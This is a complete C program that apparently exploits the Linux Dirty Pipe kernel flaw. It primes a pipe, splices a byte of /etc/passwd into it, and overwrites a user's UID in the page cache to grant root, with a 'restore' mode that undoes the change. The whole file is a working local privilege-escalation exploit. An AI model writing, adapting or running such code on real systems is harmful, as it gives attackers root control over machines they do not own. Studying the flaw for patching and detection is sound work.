#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static void fail(const char *message) {
    perror(message);
    exit(1);
}

static void prepare_pipe(int p[2]) {
    if (pipe(p) == -1) fail("pipe");
    int size = fcntl(p[1], F_GETPIPE_SZ);
    if (size <= 0) fail("F_GETPIPE_SZ");
    char buf[4096] = {0};
    for (int remaining = size; remaining > 0;) {
        int n = remaining < (int)sizeof(buf) ? remaining : (int)sizeof(buf);
        if (write(p[1], buf, n) != n) fail("pipe fill");
        remaining -= n;
    }
    for (int remaining = size; remaining > 0;) {
        int n = remaining < (int)sizeof(buf) ? remaining : (int)sizeof(buf);
        if (read(p[0], buf, n) != n) fail("pipe drain");
        remaining -= n;
    }
}

int main(int argc, char **argv) {
    if (argc != 2 || (strcmp(argv[1], "grant") && strcmp(argv[1], "restore"))) {
        fprintf(stderr, "Usage: %s grant|restore\n", argv[0]);
        return 1;
    }

    const char *needle = !strcmp(argv[1], "grant") ? "admin:x:8000:" : "admin:x:0000:";
    const char *replacement = !strcmp(argv[1], "grant") ? "0000" : "8000";
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) fail("open /etc/passwd");
    struct stat st;
    if (fstat(fd, &st) == -1) fail("fstat");
    if (st.st_size <= 0 || st.st_size > 1024 * 1024) {
        fprintf(stderr, "Unexpected passwd file size\n");
        return 1;
    }
    char *buf = malloc((size_t)st.st_size + 1);
    if (!buf) fail("malloc");
    if (pread(fd, buf, (size_t)st.st_size, 0) != st.st_size) fail("pread");
    buf[st.st_size] = '\0';

    char *entry = strstr(buf, needle);
    if (!entry || (entry != buf && entry[-1] != '\n')) {
        fprintf(stderr, "Expected admin entry not found; no changes made\n");
        return 1;
    }
    off_t offset = (off_t)(entry - buf + strlen("admin:x:"));
    if (offset % 4096 == 0 || offset + 4 > st.st_size || (offset % 4096) > 4092) {
        fprintf(stderr, "Unsafe page boundary; no changes made\n");
        return 1;
    }

    int p[2];
    prepare_pipe(p);
    loff_t splice_offset = offset - 1;
    if (splice(fd, &splice_offset, p[1], NULL, 1, 0) != 1) fail("splice");
    if (write(p[1], replacement, 4) != 4) fail("pipe write");
    close(p[0]);
    close(p[1]);

    char actual[5] = {0};
    if (pread(fd, actual, 4, offset) != 4) fail("verify pread");
    close(fd);
    if (memcmp(actual, replacement, 4) != 0) {
        fprintf(stderr, "Dirty Pipe not confirmed: expected %s, read %.4s\n", replacement, actual);
        return 1;
    }
    printf("Verified UID change: admin:x:%s:103\n", replacement);
    return 0;
}
